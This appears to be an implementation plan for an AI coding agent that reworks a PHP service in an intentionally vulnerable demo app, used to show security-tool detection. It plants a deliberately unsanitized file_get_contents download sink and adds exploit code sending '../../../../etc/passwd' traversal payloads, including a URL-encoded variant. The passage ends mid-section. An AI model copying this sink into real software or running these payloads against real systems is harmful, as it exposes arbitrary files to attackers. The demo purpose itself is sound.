# PHP trackingreportservice — Path Traversal Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Convert the in-progress `trackingreportservice` (Symfony PHP) from an XPath Injection demo (Assess-only) into a Path Traversal demo (both Assess and Protect coverage in the Contrast PHP agent).

**Architecture:** The PHP service already exists on branch `add-php-service`. We strip the XPath sinks from the controller, add a new `GET /api/tracking-report/download?file=<name>` endpoint with an unsanitized `file_get_contents` sink, seed legitimate per-shipment report files at container build time, and rewire the frontgate proxy + console-ui to drive normal + exploit traffic for the new endpoint. The helm chart, agent-operator config, and service Dockerfile baseline already exist on the branch and need only minor additions.

**Tech Stack:** PHP 8.3 + Symfony 7, Apache + `mod_php`, Java 17 / Spring Boot (frontgate proxy), Python 3 / Flask (console-ui), Helm, Docker, Kubernetes.

**Verification model:** This repository has **no automated test infrastructure**. Verification is manual via `make deploy` + `curl` against the live cluster + observing Contrast Assess / Protect telemetry. Each task's "verify" step lists the exact commands and expected output.

---

## File map

**PHP service (`services/trackingreportservice/`)**
- `src/Controller/TrackingReportController.php` — remove XPath sinks (`searchTrackingHistory`, unsafe XPath in `getTrackingReport`); add `downloadReport` action with vulnerable file read; add seed-file initialization for `var/reports/exports/`
- `Dockerfile` — ensure `var/reports/exports/` exists with correct ownership (the constructor will seed it at runtime)

**Frontgate (`services/frontgateservice/`)**
- `src/main/java/com/contrast/frontgateservice/service/TrackingReportServiceProxy.java` — remove `searchTrackingHistory`; add `downloadReport(String file)` returning `ResponseEntity<byte[]>` with content-type passthrough
- `src/main/java/com/contrast/frontgateservice/controller/ApiController.java` — remove `/api/tracking-report/search` route; add `/api/tracking-report/download` route

**Console UI (`services/console-ui/`)**
- `app.py` — rename `/exploit/xpath-injection` → `/exploit/path-traversal`; replace `run_xpath_injection_exploit` with `run_path_traversal_exploit`; update exploit list metadata; update Phase 10 normal traffic to call the download endpoint with legitimate filenames
- `templates/index.html` — replace the "XPath Injection" individual-exploit button with "Path Traversal"

**Documentation**
- `README.md` — update mermaid diagram (add `trackingreportservice` node with `⚠️ Path Traversal` label and PHP language), add service to prose list, add Path Traversal (PHP) entry
- `vulnerabilities.md` — append a "Path Traversal — trackingreportservice (PHP)" section with sink code, exploit payload, expected Assess + Protect behavior

**Spec (already committed in prior step):**
- `docs/superpowers/specs/2026-05-28-php-trackingreportservice-design.md`

---

## Task 1: PHP service — remove XPath, add Path Traversal endpoint, seed report files

**Files:**
- Modify: `services/trackingreportservice/src/Controller/TrackingReportController.php` (rewrite the controller to remove XPath sinks and add the download endpoint)
- Modify: `services/trackingreportservice/Dockerfile` (ensure exports directory exists)

- [ ] **Step 1: Open the current controller**

Run: `git show origin/add-php-service:services/trackingreportservice/src/Controller/TrackingReportController.php | wc -l`
Expected: ~370 lines.

Read the file to confirm current sink locations:
- `getTrackingReport` (around line 195): builds XPath from `$trackingId`
- `searchTrackingHistory` (around line 250): builds XPath from `$term`

- [ ] **Step 2: Rewrite `TrackingReportController.php`**

Replace the entire file contents with the version below. Key changes:
- `searchTrackingHistory` method **deleted**
- `getTrackingReport` rewritten to iterate `getElementsByTagName('shipment')` and match `trackingId` attribute via PHP string comparison (no XPath with user input)
- New `downloadReport` method with vulnerable `file_get_contents` sink
- New `seedExportFiles()` helper called from constructor — writes one `.txt` file per sample shipment to `var/reports/exports/` if it doesn't already exist
- `addTrackingEvent` left intact (already safe)

```php
<?php

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

#[Route('/api', name: 'api_')]
class TrackingReportController extends AbstractController
{
    private string $xmlFilePath;
    private string $exportsDir;

    public function __construct()
    {
        $this->xmlFilePath = __DIR__ . '/../../var/reports/tracking_history.xml';
        $this->exportsDir  = __DIR__ . '/../../var/reports/exports';
        $this->initializeXmlFile();
        $this->seedExportFiles();
    }

    private function initializeXmlFile(): void
    {
        $dir = dirname($this->xmlFilePath);
        if (!is_dir($dir)) {
            mkdir($dir, 0775, true);
        }

        if (!file_exists($this->xmlFilePath)) {
            $xml = new \DOMDocument('1.0', 'UTF-8');
            $xml->formatOutput = true;

            $root = $xml->createElement('trackingHistory');
            $xml->appendChild($root);

            $this->addSampleShipment($xml, $root, 'TRACK-A1B2C3D4', 'Whiskers', 'New York, NY', 'Los Angeles, CA', 'delivered', [
                ['2025-09-01T08:00:00Z', 'New York, NY',     'pickup',   'Package picked up from sender'],
                ['2025-09-01T16:30:00Z', 'Newark, NJ',       'transit',  'Departed sorting facility'],
                ['2025-09-02T10:15:00Z', 'Chicago, IL',      'transit',  'Arrived at intermediate facility'],
                ['2025-09-02T22:00:00Z', 'Denver, CO',       'transit',  'Departed intermediate facility'],
                ['2025-09-03T14:45:00Z', 'Los Angeles, CA',  'delivery', 'Delivered to recipient'],
            ]);

            $this->addSampleShipment($xml, $root, 'TRACK-E5F6G7H8', 'Mittens', 'Chicago, IL', 'Houston, TX', 'in_transit', [
                ['2025-09-03T09:00:00Z', 'Chicago, IL',   'pickup',  'Package picked up from sender'],
                ['2025-09-03T18:00:00Z', 'St. Louis, MO', 'transit', 'Arrived at sorting facility'],
                ['2025-09-04T06:30:00Z', 'Dallas, TX',    'transit', 'Out for final delivery leg'],
            ]);

            $this->addSampleShipment($xml, $root, 'TRACK-I9J0K1L2', 'Shadow', 'Seattle, WA', 'Miami, FL', 'delivered', [
                ['2025-08-28T07:00:00Z', 'Seattle, WA',    'pickup',   'Package picked up from sender'],
                ['2025-08-28T19:00:00Z', 'Portland, OR',   'transit',  'Departed sorting facility'],
                ['2025-08-29T11:00:00Z', 'Sacramento, CA', 'transit',  'Customs inspection cleared'],
                ['2025-08-30T09:00:00Z', 'Phoenix, AZ',    'transit',  'Arrived at regional hub'],
                ['2025-08-31T08:00:00Z', 'Atlanta, GA',    'transit',  'Final sorting complete'],
                ['2025-08-31T15:30:00Z', 'Miami, FL',      'delivery', 'Delivered to recipient'],
            ]);

            $this->addSampleShipment($xml, $root, 'TRACK-M3N4O5P6', 'Luna', 'Boston, MA', 'Portland, OR', 'processing', [
                ['2025-09-04T10:00:00Z', 'Boston, MA', 'pickup', 'Package picked up from sender'],
            ]);

            $this->addSampleShipment($xml, $root, 'TRACK-Q7R8S9T0', 'Oliver', 'Austin, TX', 'Denver, CO', 'delivered', [
                ['2025-09-01T11:00:00Z', 'Austin, TX',      'pickup',   'Package picked up from sender'],
                ['2025-09-02T03:00:00Z', 'Dallas, TX',      'transit',  'Departed sorting facility'],
                ['2025-09-02T14:00:00Z', 'Albuquerque, NM', 'transit',  'In transit'],
                ['2025-09-03T09:30:00Z', 'Denver, CO',      'delivery', 'Delivered to recipient'],
            ]);

            $xml->save($this->xmlFilePath);
        }
    }

    private function addSampleShipment(
        \DOMDocument $xml,
        \DOMElement $root,
        string $trackingId,
        string $cat,
        string $origin,
        string $destination,
        string $status,
        array $events
    ): void {
        $shipment = $xml->createElement('shipment');
        $shipment->setAttribute('trackingId', $trackingId);

        $shipment->appendChild($xml->createElement('cat', htmlspecialchars($cat)));
        $shipment->appendChild($xml->createElement('origin', htmlspecialchars($origin)));
        $shipment->appendChild($xml->createElement('destination', htmlspecialchars($destination)));
        $shipment->appendChild($xml->createElement('currentStatus', htmlspecialchars($status)));

        $eventsEl = $xml->createElement('events');
        foreach ($events as [$timestamp, $location, $type, $description]) {
            $event = $xml->createElement('event', htmlspecialchars($description));
            $event->setAttribute('timestamp', $timestamp);
            $event->setAttribute('location', htmlspecialchars($location));
            $event->setAttribute('type', htmlspecialchars($type));
            $eventsEl->appendChild($event);
        }
        $shipment->appendChild($eventsEl);

        $root->appendChild($shipment);
    }

    private function seedExportFiles(): void
    {
        if (!is_dir($this->exportsDir)) {
            mkdir($this->exportsDir, 0775, true);
        }

        $xml = new \DOMDocument();
        $xml->load($this->xmlFilePath);

        foreach ($xml->getElementsByTagName('shipment') as $shipmentNode) {
            $trackingId = $shipmentNode->getAttribute('trackingId');
            $path = $this->exportsDir . '/' . $trackingId . '.txt';
            if (file_exists($path)) {
                continue;
            }

            $lines = [];
            $lines[] = 'CARGO CATS - TRACKING REPORT';
            $lines[] = '============================';
            $lines[] = 'Tracking ID: ' . $trackingId;
            $lines[] = 'Cat:         ' . $shipmentNode->getElementsByTagName('cat')->item(0)->textContent;
            $lines[] = 'Origin:      ' . $shipmentNode->getElementsByTagName('origin')->item(0)->textContent;
            $lines[] = 'Destination: ' . $shipmentNode->getElementsByTagName('destination')->item(0)->textContent;
            $lines[] = 'Status:      ' . $shipmentNode->getElementsByTagName('currentStatus')->item(0)->textContent;
            $lines[] = '';
            $lines[] = 'EVENTS';
            $lines[] = '------';
            foreach ($shipmentNode->getElementsByTagName('event') as $eventNode) {
                $lines[] = sprintf(
                    '[%s] %-20s %-8s %s',
                    $eventNode->getAttribute('timestamp'),
                    $eventNode->getAttribute('location'),
                    $eventNode->getAttribute('type'),
                    $eventNode->textContent
                );
            }

            file_put_contents($path, implode("\n", $lines) . "\n");
        }
    }

    private function getMysqlConnection(): ?\PDO
    {
        $host     = $_ENV['DB_HOST']     ?? getenv('DB_HOST')     ?: 'localhost';
        $dbName   = $_ENV['DB_NAME']     ?? getenv('DB_NAME')     ?: 'db';
        $user     = $_ENV['DB_USER']     ?? getenv('DB_USER')     ?: 'cargocats';
        $password = $_ENV['DB_PASSWORD'] ?? getenv('DB_PASSWORD') ?: 'cargocats';

        try {
            return new \PDO(
                "mysql:host=$host;dbname=$dbName;charset=utf8",
                $user,
                $password,
                [\PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION, \PDO::ATTR_TIMEOUT => 3]
            );
        } catch (\PDOException $e) {
            return null;
        }
    }

    private function syncFromMysql(string $trackingId): void
    {
        $pdo = $this->getMysqlConnection();
        if ($pdo === null) {
            return;
        }

        $stmt = $pdo->prepare(
            'SELECT s.tracking_id, s.status,
                    c.name   AS cat_name,
                    fa.address AS origin,
                    ta.address AS destination
             FROM shipment s
             LEFT JOIN cat     c  ON s.cat_id      = c.id
             LEFT JOIN address fa ON s.from_address = fa.id
             LEFT JOIN address ta ON s.to_address   = ta.id
             WHERE s.tracking_id = ?'
        );
        $stmt->execute([$trackingId]);
        $row = $stmt->fetch(\PDO::FETCH_ASSOC);

        if (!$row) {
            return;
        }

        $xml = new \DOMDocument();
        $xml->load($this->xmlFilePath);
        $xml->formatOutput = true;

        $shipmentNode = $this->findShipmentNode($xml, $trackingId);

        if ($shipmentNode !== null) {
            $statusNode = $shipmentNode->getElementsByTagName('currentStatus')->item(0);
            if ($statusNode) {
                $statusNode->textContent = $row['status'] ?? 'unknown';
            }
        } else {
            $root     = $xml->getElementsByTagName('trackingHistory')->item(0);
            $shipment = $xml->createElement('shipment');
            $shipment->setAttribute('trackingId', $trackingId);
            $shipment->appendChild($xml->createElement('cat',         htmlspecialchars($row['cat_name']    ?? 'Unknown', ENT_XML1)));
            $shipment->appendChild($xml->createElement('origin',      htmlspecialchars($row['origin']       ?? 'Unknown', ENT_XML1)));
            $shipment->appendChild($xml->createElement('destination', htmlspecialchars($row['destination']  ?? 'Unknown', ENT_XML1)));
            $shipment->appendChild($xml->createElement('currentStatus', htmlspecialchars($row['status']    ?? 'unknown', ENT_XML1)));
            $shipment->appendChild($xml->createElement('events'));
            $root->appendChild($shipment);
        }

        $xml->save($this->xmlFilePath);
    }

    private function findShipmentNode(\DOMDocument $xml, string $trackingId): ?\DOMElement
    {
        foreach ($xml->getElementsByTagName('shipment') as $shipmentNode) {
            if ($shipmentNode->getAttribute('trackingId') === $trackingId) {
                return $shipmentNode;
            }
        }
        return null;
    }

    #[Route('/health', name: 'health', methods: ['GET'])]
    public function health(): JsonResponse
    {
        return $this->json([
            'status'    => 'healthy',
            'service'   => 'trackingreportservice',
            'version'   => '1.0.0',
            'timestamp' => (new \DateTime())->format('c'),
        ]);
    }

    #[Route('/tracking-report', name: 'tracking_report_get', methods: ['GET'])]
    public function getTrackingReport(Request $request): JsonResponse
    {
        $trackingId = $request->query->get('tracking_id', '');

        if ($trackingId === '') {
            return $this->json(['error' => 'tracking_id query parameter is required'], 400);
        }

        $this->syncFromMysql($trackingId);

        $xml = new \DOMDocument();
        $xml->load($this->xmlFilePath);

        $shipmentNode = $this->findShipmentNode($xml, $trackingId);
        if ($shipmentNode === null) {
            return $this->json(['error' => 'No tracking history found for the given tracking ID'], 404);
        }

        $events = [];
        foreach ($shipmentNode->getElementsByTagName('event') as $eventNode) {
            $events[] = [
                'timestamp'   => $eventNode->getAttribute('timestamp'),
                'location'    => $eventNode->getAttribute('location'),
                'type'        => $eventNode->getAttribute('type'),
                'description' => $eventNode->textContent,
            ];
        }

        $report = [
            'tracking_id'     => $shipmentNode->getAttribute('trackingId'),
            'cat'             => $shipmentNode->getElementsByTagName('cat')->item(0)->textContent,
            'origin'          => $shipmentNode->getElementsByTagName('origin')->item(0)->textContent,
            'destination'     => $shipmentNode->getElementsByTagName('destination')->item(0)->textContent,
            'current_status'  => $shipmentNode->getElementsByTagName('currentStatus')->item(0)->textContent,
            'event_count'     => count($events),
            'events'          => $events,
            'report_generated_at' => (new \DateTime())->format('c'),
        ];

        return $this->json($report);
    }

    /**
     * Stream a saved per-shipment tracking report from disk.
     *
     * VULNERABLE: $file is concatenated directly to the base path. No
     * realpath() check, no basename() stripping, no allowlist. An attacker
     * can supply ../ segments to read arbitrary files on the filesystem.
     *
     * Example payload: ?file=../../../../etc/passwd
     */
    #[Route('/tracking-report/download', name: 'tracking_report_download', methods: ['GET'])]
    public function downloadReport(Request $request): Response
    {
        $file = $request->query->get('file', '');
        if ($file === '') {
            return $this->json(['error' => 'file query parameter is required'], 400);
        }

        $path = $this->exportsDir . '/' . $file;

        if (!file_exists($path)) {
            return $this->json(['error' => 'Report not found'], 404);
        }

        $contents = file_get_contents($path);

        return new Response(
            $contents,
            200,
            ['Content-Type' => 'text/plain; charset=utf-8']
        );
    }

    #[Route('/tracking-report/events', name: 'tracking_report_add_event', methods: ['POST'])]
    public function addTrackingEvent(Request $request): JsonResponse
    {
        $data = json_decode($request->getContent(), true);

        $trackingId  = $data['tracking_id']  ?? null;
        $location    = $data['location']     ?? null;
        $type        = $data['type']         ?? 'transit';
        $description = $data['description']  ?? null;

        if (!$trackingId || !$location || !$description) {
            return $this->json(['error' => 'tracking_id, location, and description are required'], 400);
        }

        $xml = new \DOMDocument();
        $xml->load($this->xmlFilePath);
        $xml->formatOutput = true;

        $shipmentNode = $this->findShipmentNode($xml, $trackingId);
        if ($shipmentNode === null) {
            return $this->json(['error' => 'Shipment not found'], 404);
        }

        $eventsNode = $shipmentNode->getElementsByTagName('events')->item(0);
        if (!$eventsNode) {
            $eventsNode = $xml->createElement('events');
            $shipmentNode->appendChild($eventsNode);
        }

        $event = $xml->createElement('event', htmlspecialchars($description));
        $event->setAttribute('timestamp', (new \DateTime())->format('c'));
        $event->setAttribute('location', htmlspecialchars($location));
        $event->setAttribute('type', htmlspecialchars($type));
        $eventsNode->appendChild($event);

        if ($type === 'delivery') {
            $statusNode = $shipmentNode->getElementsByTagName('currentStatus')->item(0);
            if ($statusNode) {
                $statusNode->textContent = 'delivered';
            }
        }

        $xml->save($this->xmlFilePath);

        return $this->json([
            'message'    => 'Tracking event recorded',
            'tracking_id' => $trackingId,
            'event' => [
                'timestamp'   => (new \DateTime())->format('c'),
                'location'    => $location,
                'type'        => $type,
                'description' => $description,
            ],
        ], 201);
    }
}
```

- [ ] **Step 3: Update Dockerfile to pre-create exports dir**

The Dockerfile already creates `var/reports`. Extend the existing `mkdir` line to include `var/reports/exports`:

In `services/trackingreportservice/Dockerfile`, find:

```dockerfile
RUN mkdir -p /var/www/var/cache /var/www/var/log /var/www/var/reports \
    && chown -R www-data:www-data /var/www
```

Change to:

```dockerfile
RUN mkdir -p /var/www/var/cache /var/www/var/log /var/www/var/reports /var/www/var/reports/exports \
    && chown -R www-data:www-data /var/www
```

- [ ] **Step 4: Sanity-check PHP syntax**

Run: `php -l services/trackingreportservice/src/Controller/TrackingReportController.php`
Expected: `No syntax errors detected`

If `php` is not installed locally, skip — the build step in Task 6 will catch syntax errors.

- [ ] **Step 5: Commit**

```bash
git add services/trackingreportservice/src/Controller/TrackingReportController.php services/trackingreportservice/Dockerfile
git commit -m "$(cat <<'EOF'
feat(php): replace XPath injection with Path Traversal sink

- Remove searchTrackingHistory endpoint entirely (XPath sink)
- Rewrite getTrackingReport to use safe DOM iteration instead of XPath
- Add GET /api/tracking-report/download?file= with vulnerable file_get_contents
- Seed per-shipment text reports under var/reports/exports/ at boot

The new sink has both Assess and Protect coverage in the Contrast PHP
agent, restoring the dual coverage story for this service.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Frontgate — drop search proxy method, add download proxy + route

**Files:**
- Modify: `services/frontgateservice/src/main/java/com/contrast/frontgateservice/service/TrackingReportServiceProxy.java`
- Modify: `services/frontgateservice/src/main/java/com/contrast/frontgateservice/controller/ApiController.java`

- [ ] **Step 1: Update the proxy**

In `TrackingReportServiceProxy.java`:

**Remove** the entire `searchTrackingHistory` method (the block starting `public ResponseEntity<String> searchTrackingHistory(String q)`).

**Add** a `downloadReport` method that returns raw bytes plus content-type. Place it after `addTrackingEvent` and before `healthCheck`:

```java
    public ResponseEntity<byte[]> downloadReport(String file) {
        try {
            String url = trackingReportServiceUrl + "/api/tracking-report/download?file="
                    + URLEncoder.encode(file, StandardCharsets.UTF_8);

            HttpHeaders headers = new HttpHeaders();
            headers.setAccept(Collections.singletonList(MediaType.ALL));

            HttpEntity<Void> entity = new HttpEntity<>(headers);

            return restTemplate.exchange(url, HttpMethod.GET, entity, byte[].class);
        } catch (HttpClientErrorException | HttpServerErrorException e) {
            return ResponseEntity.status(e.getStatusCode())
                    .body(e.getResponseBodyAsByteArray());
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                    .body(("{\"error\": \"Unable to connect to tracking report service\"}").getBytes(StandardCharsets.UTF_8));
        }
    }
```

- [ ] **Step 2: Update the API controller**

In `ApiController.java`:

**Remove** the `searchTrackingHistory` route (around lines 291-298):

```java
    @GetMapping("/tracking-report/search")
    public ResponseEntity<String> searchTrackingHistory(@RequestParam String q) {
        logger.info("API request: Searching tracking history for '{}'", q);
        ResponseEntity<String> response = trackingReportServiceProxy.searchTrackingHistory(q);
        return ResponseEntity.status(response.getStatusCode())
                .contentType(org.springframework.http.MediaType.APPLICATION_JSON)
                .body(response.getBody());
    }
```

**Add** a `downloadReport` route immediately after the `addTrackingEvent` route (around line 307). Place it before `getMyShipments`:

```java
    @GetMapping("/tracking-report/download")
    public ResponseEntity<byte[]> downloadTrackingReport(@RequestParam String file) {
        logger.info("API request: Downloading tracking report file '{}'", file);
        ResponseEntity<byte[]> response = trackingReportServiceProxy.downloadReport(file);
        return ResponseEntity.status(response.getStatusCode())
                .contentType(org.springframework.http.MediaType.TEXT_PLAIN)
                .body(response.getBody());
    }
```

- [ ] **Step 3: Verify the file compiles in isolation (best-effort)**

The frontgate Maven build runs as part of `make build-frontgateservice`. We won't invoke that here — Task 6's full deploy will catch any compile errors. Manually confirm no references to `searchTrackingHistory` remain:

Run: `grep -n searchTrackingHistory services/frontgateservice/src/main/java/com/contrast/frontgateservice/**/*.java`
Expected: no output (no matches).

- [ ] **Step 4: Commit**

```bash
git add services/frontgateservice/src/main/java/com/contrast/frontgateservice/service/TrackingReportServiceProxy.java services/frontgateservice/src/main/java/com/contrast/frontgateservice/controller/ApiController.java
git commit -m "$(cat <<'EOF'
feat(frontgate): proxy tracking-report download endpoint

Remove the /api/tracking-report/search proxy (XPath demo deleted) and
add /api/tracking-report/download which proxies the Path Traversal
sink in the PHP service.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Console UI — replace XPath exploit with Path Traversal exploit

**Files:**
- Modify: `services/console-ui/app.py`
- Modify: `services/console-ui/templates/index.html`

- [ ] **Step 1: Replace the exploit route handler**

In `services/console-ui/app.py`, find the block starting `@app.route('/exploit/xpath-injection')` (introduced on this branch). Replace the **entire route handler** (the `@app.route` line through its closing `finally:` block, ~30 lines) with:

```python
@app.route('/exploit/path-traversal')
def exploit_path_traversal():
    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag

    if exploit_running:
        return jsonify({"status": "error", "message": "Exploit already running"}), 400

    exploit_running = True
    exploit_state = "path_traversal"

    try:
        session = requests.Session()
        login_result = run_login_exploit(session)
        if not login_result:
            log_exploit_output("Login failed - cannot proceed with Path Traversal exploit", "ERROR")
            return jsonify({"status": "error", "message": "Login failed - cannot proceed with Path Traversal exploit"}), 500

        result = run_path_traversal_exploit(session)
        exploit_state = "finished"
        log_exploit_output(f"Path Traversal exploit completed - Success: {result}")
        return jsonify({"status": "success", "message": "Path Traversal exploit completed", "result": result}), 200
    except Exception as e:
        exploit_state = "error"
        log_exploit_output(f"Path Traversal exploit failed: {str(e)}", "ERROR")
        return jsonify({"status": "error", "message": f"Path Traversal exploit failed: {str(e)}"}), 500
    finally:
        exploit_running = False
```

- [ ] **Step 2: Replace the exploit function**

In `services/console-ui/app.py`, find `def run_xpath_injection_exploit(session):` and replace the **entire function** (through its closing `return` line) with:

```python
def run_path_traversal_exploit(session):
    """Execute Path Traversal exploits via tracking report download endpoint"""
    log_exploit_output("Executing Path Traversal exploits via tracking report download endpoint")

    success = False

    # -------------------------------------------------------
    # 1. Baseline: confirm a legitimate file fetch works.
    # -------------------------------------------------------
    legit_file = "TRACK-A1B2C3D4.txt"
    r = session.get(
        f"http://cargocats.localhost/api/tracking-report/download?file={requests.utils.quote(legit_file)}",
        timeout=15
    )
    log_exploit_output(f"Baseline download ({legit_file}) status: {r.status_code}")
    if r.status_code == 200 and "TRACK-A1B2C3D4" in r.text:
        log_exploit_output("Baseline download returned the expected tracking report")

    # -------------------------------------------------------
    # 2. Classic dotdot traversal: read /etc/passwd
    # -------------------------------------------------------
    payload = "../../../../etc/passwd"
    r = session.get(
        f"http://cargocats.localhost/api/tracking-report/download?file={requests.utils.quote(payload)}",
        timeout=15
    )
    log_exploit_output(f"Path Traversal (raw ../../) response status: {r.status_code}")
    if r.status_code == 200 and "root:" in r.text:
        log_exploit_output("SUCCESS: Path Traversal returned /etc/passwd contents")
        success = True
    elif r.status_code in (403, 406):
        log_exploit_output("Path Traversal request appears to have been blocked (Protect/RASP)")
        success = True  # blocked == demonstrated

    # -------------------------------------------------------
    # 3. URL-encoded variant — exercises a second sink trace
    # -------------------------------------------------------
    encoded_payload = "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    r = session.get(
        f"http://cargocats.localhost/api/tracking-report/download?file={encoded_payload}",
        timeout=15
    )
    log_exploit_output(f"Path Traversal (URL-encoded) response status: {r.status_code}")
    if r.status_code == 200 and "root:" in r.text:
        log_exploit_output("SUCCESS: URL-encoded Path Traversal returned /etc/passwd contents")
        success = True
    elif r.status_code in (403, 406):
        log_exploit_output("URL-encoded Path Traversal appears to have been blocked (Protect/RASP)")
        success = True

    return success
```

- [ ] **Step 3: Update the `/exploit/list` entry**

In `services/console-ui/app.py`, find the `exploit_list()` function and replace the XPath Injection list entry:

Replace:
```python
        {"name": "XPath Injection", "endpoint": "/exploit/xpath-injection", "description": "XPath injection exploit via tracking report service (ID lookup, search tautology, blind exfil)"}
```

With:
```python
        {"name": "Path Traversal", "endpoint": "/exploit/path-traversal", "description": "Path traversal exploit via tracking report download endpoint (PHP)"}
```

- [ ] **Step 4: Update the orchestrated `exploit()` chain**

In `services/console-ui/app.py`, find the block in the `exploit()` function that says:

```python
        # ================================================
        # XPATH INJECTION EXPLOIT
        # ================================================
        exploit_state = "xpath_injection"
        if check_exploit_stop("XPath injection"):
            return
        run_xpath_injection_exploit(session)
```

Replace it with:

```python
        # ================================================
        # PATH TRAVERSAL EXPLOIT
        # ================================================
        exploit_state = "path_traversal"
        if check_exploit_stop("Path Traversal"):
            return
        run_path_traversal_exploit(session)
```

- [ ] **Step 5: Update Phase 10 normal traffic**

In `services/console-ui/app.py`, find the Phase 10 block in the `traffic()` function (search for `Phase 10: Tracking report service`). The existing block already handles GET-by-ID and POST event. Add a **download** call using a known seeded file. Insert these lines inside the `if shipment_tracking_id:` block, after the search-by-prefix block (which exists on this branch) — or, if you prefer, append the new block at the end of the `if shipment_tracking_id:` body. Then remove the existing "Search by partial tracking ID prefix" block since that endpoint no longer exists.

Find and remove (the existing search block):
```python
            # Search by partial tracking ID prefix
            prefix = shipment_tracking_id[:8] if len(shipment_tracking_id) >= 8 else shipment_tracking_id
```
(and the following 2-3 lines that perform the search request — remove the entire search sub-block; if uncertain about exact lines, run `grep -n "tracking-report/search" services/console-ui/app.py` and remove the entire request block at that line and its log line).

Add inside `if shipment_tracking_id:`, after the existing POST event request:

```python
            # Download a saved per-shipment report (uses one of the seeded files)
            seeded_files = [
                "TRACK-A1B2C3D4.txt",
                "TRACK-E5F6G7H8.txt",
                "TRACK-I9J0K1L2.txt",
                "TRACK-M3N4O5P6.txt",
                "TRACK-Q7R8S9T0.txt",
            ]
            chosen = random.choice(seeded_files)
            r = session.get(
                f"http://cargocats.localhost/api/tracking-report/download?file={requests.utils.quote(chosen)}",
                timeout=10, allow_redirects=False
            )
            log_traffic_output(f"Tracking report download ({chosen}) - Status: {r.status_code}")
```

(Verify `random` is already imported in `app.py`. Run `grep -n "^import random" services/console-ui/app.py`; if no match, add `import random` near the other top-of-file imports.)

- [ ] **Step 6: Sweep for any remaining XPath references**

Run: `grep -n -i xpath services/console-ui/app.py`
Expected: no output.

Run: `grep -n "tracking-report/search" services/console-ui/app.py`
Expected: no output.

- [ ] **Step 7: Update the index.html button**

In `services/console-ui/templates/index.html`, find:

```html
                    <button class="btn-individual-exploit" onclick="runIndividualExploit('xpath-injection')">XPath Injection</button>
```

Replace with:

```html
                    <button class="btn-individual-exploit" onclick="runIndividualExploit('path-traversal')">Path Traversal (PHP)</button>
```

- [ ] **Step 8: Sanity-check Python syntax**

Run: `python3 -m py_compile services/console-ui/app.py`
Expected: no output, exit code 0.

- [ ] **Step 9: Commit**

```bash
git add services/console-ui/app.py services/console-ui/templates/index.html
git commit -m "$(cat <<'EOF'
feat(console-ui): swap XPath exploit for Path Traversal exploit

- /exploit/xpath-injection -> /exploit/path-traversal
- run_xpath_injection_exploit() -> run_path_traversal_exploit()
- Phase 10 normal traffic now exercises the new download endpoint
  with seeded report filenames instead of the deleted /search route
- Individual-exploit button relabeled

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: README — update diagram and prose

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Update the mermaid diagram**

In `README.md`, find the existing Backends subgraph. Add a new node next to the other services (matching the pattern of `DS`, `WH`, etc.). After the `RS` (reportservice) node line and before the `AS` (aiservice) line, add:

```
                TR["<b>trackingreportservice</b><br/>PHP<br/>━━━━━━<br/><font color='#c00'>⚠️ Path Traversal</font><br/>━━━━━━<br/>🛡️ <font color='#093'>Contrast</font> | <font color='#0066cc'>Falco</font>"]
```

Then add an edge from frontgate to it. Find the existing `FG --> RS` line in the edges section and add directly after it:

```
    FG --> TR
```

Finally, find the `classDef vuln ...` `class` line:

```
    class FG,DS,WH,IS,LS,DC,RS,AS,OL,DB,Ingress vuln
```

And insert `TR` into the comma-separated list:

```
    class FG,DS,WH,IS,LS,DC,RS,AS,TR,OL,DB,Ingress vuln
```

- [ ] **Step 2: Update the prose service list**

In `README.md`, find the `### Vulnerable Application Services` heading and the bulleted list under it. After the `AiService` bullet, add:

```markdown
- **Trackingreportservice** (PHP/Symfony) - Generates and serves persisted tracking reports. Path Traversal vulnerability in the report download endpoint.
```

Then update the count in the lead sentence. Find:

```markdown
The core application consists of eight intentionally vulnerable microservices:
```

Change to:

```markdown
The core application consists of nine intentionally vulnerable microservices:
```

- [ ] **Step 3: Update the vulnerabilities bullet list**

In `README.md`, find the bulleted list under `### 📋 Vulnerability Documentation`. After the existing `Path Traversal` bullet (from imageservice), add no new bullet — instead, find the `Path Traversal` bullet and append `(.NET imageservice and PHP trackingreportservice)` to clarify dual-language coverage. If the existing bullet just says `Path Traversal`, change to:

```markdown
- Path Traversal (.NET imageservice and PHP trackingreportservice)
```

- [ ] **Step 4: Commit**

```bash
git add README.md
git commit -m "$(cat <<'EOF'
docs: add trackingreportservice (PHP) to README diagram and lists

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 5: vulnerabilities.md — document the Path Traversal demo

**Files:**
- Modify: `vulnerabilities.md`

- [ ] **Step 1: Append a new section**

Open `vulnerabilities.md`. Read the existing structure (each vulnerability has a heading, location, exploit example, expected detection). Match the existing format. Append a new section at the end of the document:

```markdown
## Path Traversal (PHP — trackingreportservice)

**Service:** `trackingreportservice` (PHP/Symfony)
**Endpoint:** `GET /api/tracking-report/download?file=<name>`
**Sink:** `file_get_contents($this->exportsDir . '/' . $file)` in `TrackingReportController::downloadReport`

### Description

The download endpoint concatenates the user-supplied `file` query parameter directly to the base export directory with no `realpath()` check, no `basename()` stripping, and no allowlist. An attacker can use `../` segments to escape `var/reports/exports/` and read arbitrary files on the container filesystem.

### Legitimate request

```bash
curl 'http://app.localhost/api/tracking-report/download?file=TRACK-A1B2C3D4.txt'
```

Returns the seeded plain-text report for that shipment.

### Exploit payload

```bash
